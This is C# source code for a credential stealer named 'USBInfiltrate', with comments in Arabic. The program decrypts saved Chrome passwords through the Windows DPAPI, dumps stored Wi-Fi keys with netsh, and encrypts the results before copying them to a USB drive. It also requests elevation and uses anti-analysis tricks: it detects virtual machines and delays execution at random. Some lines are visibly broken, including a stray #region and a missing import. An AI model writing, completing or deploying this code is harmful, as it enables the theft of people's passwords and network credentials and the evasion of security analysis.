    using System;
using System.Diagnostics;
using System.IO;
using System.Data.SQLite;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;
using System.Management;

namespace USBInfiltrate
{
    class StealthModule
    {
        const int CRYPTPROTECT_UI_FORBIDDEN = 0x1;

        [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool CryptUnprotectData(
            ref DATA_BLOB pCipherText,
            ref string pszDescription,
            ref DATA_BLOB pEntropy,
            IntPtr pReserved,
            IntPtr pPrompt,
            int dwFlags,
            ref DATA_BLOB pPlainText);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DATA_BLOB
        {
            public int cbData;
            public IntPtr pbData;
        }

        private static byte[] DecryptChromePassword(byte[] encryptedData)
        {
            try
            {
DATA_BLOB encryptedBlob = new DATA_BLOB();
encryptedBlob.pbData = Marshal.AllocHGlobal(encryptedData.Length);
encryptedBlob.cbData = encryptedData.Length;
Marshal.Copy(encryptedData, 0, encryptedBlob.pbData, encryptedData.Length);

DATA_BLOB decryptedBlob = new DATA_BLOB();
string description = String.Empty;
DATA_BLOB entropy = new DATA_BLOB();

bool success = CryptUnprotectData(
    ref encryptedBlob,
    ref description,
    ref entropy,
    IntPtr.Zero,
    IntPtr.Zero,
    CRYPTPROTECT_UI_FORBIDDEN,
    ref decryptedBlob);

                if (!success)
                    return null;

                byte[] decryptedBytes = new byte[decryptedBlob.cbData];
                Marshal.Copy(decryptedBlob.pbData, decryptedBytes, 0, decryptedBlob.cbData);
                return decryptedBytes;
            }
            catch { return null; }
        }

        static string AESEncrypt(string data, string key)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = Encoding.UTF8.GetBytes(key.PadRight(32));
                aesAlg.IV = new byte[16];

                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);
                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                        {
                            swEncrypt.Write(data);
                        }
                        return Convert.ToBase64String(msEncrypt.ToArray());
                    }
                }
            }
        }

        static void SecureFileWrite(string path, string content)
        {
            string encryptionKey = "YourSecureEncryptionKey123!";
#region             File.WriteAllText(path, AESEncrypt(content, encryptionKey));
    }

        static string GetUSBPath()
        {
            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                if (drive.DriveType == DriveType.Removable && drive.IsReady)
                {
                    return drive.RootDirectory.FullName;
                }
            }
            return null;
        }

        static void ExtractCredentials()
        {
            string tempPath = Path.Combine(Path.GetTempPath(), "SystemReport");
            Directory.CreateDirectory(tempPath);

            // Chrome passwords
            string chromeData = "";
            string chromeDB = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), 
                @"Google\Chrome\User Data\Default\Login Data");
            
            if (File.Exists(chromeDB))
            {
                try
                {
                    string tempDB = Path.Combine(tempPath, "temp_chrome.db");
                    File.Copy(chromeDB, tempDB, true);

                    using (var conn = new SQLiteConnection($"Data Source={tempDB};Version=3;"))
                    {
                        conn.Open();
                        using (var cmd = conn.CreateCommand())
                        {
                            cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins";
                            using (var reader = cmd.ExecuteReader())
                            {
                                while (reader.Read())
                                {
                                    byte[] encryptedPassword = (byte[])reader["password_value"];
                                    byte[] decryptedPassword = DecryptChromePassword(encryptedPassword);
                                    chromeData += $"\nURL: {reader["origin_url"]}" +
                                                  $"\nUser: {reader["username_value"]}" +
                                                  $"\nPass: {Encoding.UTF8.GetString(decryptedPassword)}\n";
                                }
                            }
                        }
                    }
                    File.Delete(tempDB);
                }
                catch { }
            }

            // WiFi passwords
            string wifiData = "";
            try
            {
                Process wifiProcess = new Process();
                wifiProcess.StartInfo = new ProcessStartInfo("netsh", "wlan show profiles")
                {
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                wifiProcess.Start();
                
                string[] profiles = wifiProcess.StandardOutput.ReadToEnd()
                    .Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.RemoveEmptyEntries);
                
                foreach (string profile in profiles)
                {
                    if (profile.Contains("All User Profile"))
                    {
                        string profileName = profile.Split(':')[1].Trim();
                        Process keyProcess = new Process();
                        keyProcess.StartInfo = new ProcessStartInfo("netsh", 
                            $"wlan show profile name=\"{profileName}\" key=clear")
                        {
                            RedirectStandardOutput = true,
                            UseShellExecute = false,
                            CreateNoWindow = true
                        };
                        keyProcess.Start();
                        wifiData += keyProcess.StandardOutput.ReadToEnd();
                    }
                }
            }
            catch { }

            // Save data
            SecureFileWrite(Path.Combine(tempPath, "chrome.txt"), chromeData);
            SecureFileWrite(Path.Combine(tempPath, "wifi.txt"), wifiData);

            // Copy to USB
            string usbPath = GetUSBPath();
            if (usbPath != null)
            {
                foreach (string file in Directory.GetFiles(tempPath))
                {
                    File.Copy(file, Path.Combine(usbPath, Path.GetFileName(file)), true);
                }
                Directory.Delete(tempPath, true);
            }
        }

        static void Main()
        {
            if (!IsAdministrator())
            {
                // إعادة التشغيل بحقوق المدير
                ProcessStartInfo proc = new ProcessStartInfo();
                proc.UseShellExecute = true;
                proc.WorkingDirectory = Environment.CurrentDirectory;
                proc.FileName = System.Reflection.Assembly.GetEntryAssembly().Location;
                proc.Verb = "runas";
                try { Process.Start(proc); }
                catch { return; }
                Environment.Exit(0);
            }

            // تقنيات مقاومة التحليل
            AntiAnalysis();

            ExtractCredentials();
        }

        static bool IsAdministrator()
        {
            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))
                .IsInRole(WindowsBuiltInRole.Administrator);
        }

        static void AntiAnalysis()
        {
            // تقنيات اكتشاف البيئات الافتراضية
            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                foreach (var item in searcher.Get())
                {
                    string manufacturer = item["Manufacturer"].ToString().ToLower();
                    if (manufacturer.Contains("vmware") || 
                        manufacturer.Contains("virtualbox") ||
                        manufacturer.Contains("qemu"))
                    {
                        Environment.Exit(0);
                    }
                }
            }

            // تأخير التنفيذ العشوائي
            Random rnd = new Random();
            Thread.Sleep(rnd.Next(3000, 7000));
        }
    }
}